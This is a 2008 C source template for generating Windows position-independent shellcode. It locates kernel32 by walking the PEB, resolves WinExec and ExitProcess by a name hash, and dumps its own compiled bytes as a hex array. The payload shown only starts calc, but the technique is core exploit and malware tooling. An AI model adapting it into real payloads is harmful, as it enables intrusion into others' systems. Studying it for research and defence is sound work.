//-------------------------------------------------------------------------
// Shellcode Template in C
//
// Compile with VC 6:
// C:\CSC> cl.exe -MD -O1 Shellcode.c
// 
// tombkeeper@gmail.com
// 2008.05
//-------------------------------------------------------------------------

#include <winsock2.h>
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#pragma comment( lib, "Kernel32.lib" )
#pragma comment( linker,"/ENTRY:main" )
#pragma comment( linker, "/ALIGN:4096" )
#pragma data_seg( ".text" )
#pragma const_seg( ".text" )

typedef  void * ( __stdcall * WinAPIPtr )();
typedef  void * ( __cdecl * CFuncPtr )();
//-------------------------------------------------------------------------
#define HASH_WinExec                    0x25e6b913
#define HASH_ExitProcess                0xcbff6bb9
struct KERNEL32
{
    PVOID BaseAddr;
    WinAPIPtr WinExec;
    WinAPIPtr ExitProcess;
};

void* GetProcAddrByHash( PVOID LibBaseAddr, DWORD FnHash );
PVOID GetKernel32Base(void);

//-------------------------------------------------------------------------
void __declspec(naked) StartSign (){}
//-------------------------------------------------------------------------

void ShellCode(void)
{
    struct  KERNEL32    Kernel32;
    DWORD   sz_String[] = { 0x636c6163, 0x00000000 };

    Kernel32.BaseAddr = GetKernel32Base();

    Kernel32.ExitProcess = GetProcAddrByHash( Kernel32.BaseAddr, HASH_ExitProcess);
    Kernel32.WinExec = GetProcAddrByHash( Kernel32.BaseAddr, HASH_WinExec);

    Kernel32.WinExec( sz_String, SW_SHOWNORMAL );
    Kernel32.ExitProcess(0);
}

//-------------------------------------------------------------------------
#pragma pack(8)

struct _ACTIVATION_CONTEXT;

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING;

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG Flags;
    USHORT LoadCount;
    USHORT TlsIndex;
    union {
        LIST_ENTRY HashLinks;
        struct {
            PVOID SectionPointer;
            ULONG CheckSum;
        };
    };
    union {
        struct {
            ULONG TimeDateStamp;
        };
        struct {
            PVOID LoadedImports;
        };
    };
    struct _ACTIVATION_CONTEXT * EntryPointActivationContext;

    PVOID PatchInformation;

} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct EB_LDR_DATA {
    ULONG Length;
    BOOLEAN Initialized;
    HANDLE SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    PVOID EntryInProgress;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct EB_HEAD {
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    union {
        BOOLEAN BitField;
        struct {
            BOOLEAN ImageUsesLargePages : 1;
            BOOLEAN SpareBits : 7;
         };
    };
    HANDLE Mutant;
    PVOID  ImageBaseAddress;
    PPEB_LDR_DATA Ldr;
} PEB_HEAD, * PPEB_HEAD;

//-------------------------------------------------------------------------
__forceinline DWORD GetCurrentTeb(void)
{
    __asm mov eax, fs:[0x18]
}

__forceinline DWORD GetCurrentPeb(void)
{
    return *(DWORD*)( GetCurrentTeb()+0x30 );
}

PVOID GetKernel32Base(void)
{
    PPEB_HEAD pPEB = (PPEB_HEAD)GetCurrentPeb();
    PLIST_ENTRY pListHead = pPEB->Ldr->InInitializationOrderModuleList.Flink;
    PLDR_DATA_TABLE_ENTRY pLDR_DATA_TABLE_ENTRY;
    int i;
    for( i = 0; i < 2; i++ )
    {
        pLDR_DATA_TABLE_ENTRY = CONTAINING_RECORD ( 
            pListHead->Flink, LDR_DATA_TABLE_ENTRY, InInitializationOrderLinks
        );
        if( pLDR_DATA_TABLE_ENTRY->BaseDllName.Buffer[8] == 0x002E ) break;
        pListHead = pListHead->Flink;
    }
    return pLDR_DATA_TABLE_ENTRY->DllBase;
}

//-------------------------------------------------------------------------
__forceinline DWORD HashKey(char *key)
{
    DWORD nHash = 0;
    while (*key)
    {
        nHash = (nHash<<5) + nHash + *key++;
    }
    return nHash;
}

void* GetProcAddrByHash( PVOID LibBaseAddr, DWORD FnHash )
{
    DWORD *pNameBase;
    void* Function;
    int Ordinals;
    PIMAGE_DOS_HEADER pDos;
    PIMAGE_NT_HEADERS pNT;
    PIMAGE_EXPORT_DIRECTORY pExport;
    BOOL Found = FALSE;

    pDos = ( PIMAGE_DOS_HEADER )LibBaseAddr;
    pNT = ( PIMAGE_NT_HEADERS )( (DWORD)LibBaseAddr+(DWORD)pDos->e_lfanew );
    pExport=( PIMAGE_EXPORT_DIRECTORY )( (DWORD)LibBaseAddr+pNT->OptionalHeader.DataDirectory[0].VirtualAddress );
    pNameBase=( DWORD* )( (DWORD)LibBaseAddr+pExport->AddressOfNames );
    for (Ordinals = 0; Ordinals < pExport->NumberOfNames; Ordinals++)
    {
        char *pName=(char*)LibBaseAddr+*pNameBase;
        if( HashKey(pName) == FnHash )
        {
            Found = TRUE;
            break;
        }
        pNameBase++;
    }
    if( Found )
    {
        WORD Index;
        Index = ( (WORD*)( (DWORD)LibBaseAddr+pExport->AddressOfNameOrdinals) )[Ordinals];
        Function = (void *)( (DWORD)LibBaseAddr+((DWORD*)((DWORD)LibBaseAddr+pExport->AddressOfFunctions))[Index] );
        return Function;
    }
    return NULL;
}

//-------------------------------------------------------------------------
void __declspec(naked) EndSign (){}
//-------------------------------------------------------------------------

void ShellCodeToHex
(
    BYTE *ShellCode,
    DWORD ShellCodeSize,
    FILE *stream
)
{
    char Head[] = "BYTE ShellCode[] = {";
    char Tail[] = "};\n";
    int i;

    fprintf( stream, Head );
    for( i=0; i<ShellCodeSize; i++ )
    {
        if ( (i%16)==0 )   // 16 bytes per line
        {
            fprintf( stream, "%s    ", "\n" );
        }
        if ( i != (ShellCodeSize-1) )
        {
            fprintf( stream, "0x%.2X,", ShellCode[i] );
        }
        else
        {
            fprintf( stream, "0x%.2X", ShellCode[i] );
            fprintf( stream, "%s", "\n" );
        }
    }
    fprintf( stream, Tail );
    fprintf( stream, "DWORD ShellCodeSize = %d;\n", ShellCodeSize );
}

void main(void)
{
    DWORD ShellCodeSize;

    ShellCodeSize = (DWORD)EndSign - (DWORD)StartSign;
    ShellCodeToHex ( (BYTE *)ShellCode, ShellCodeSize, stdout );
    // ShellCode();
}

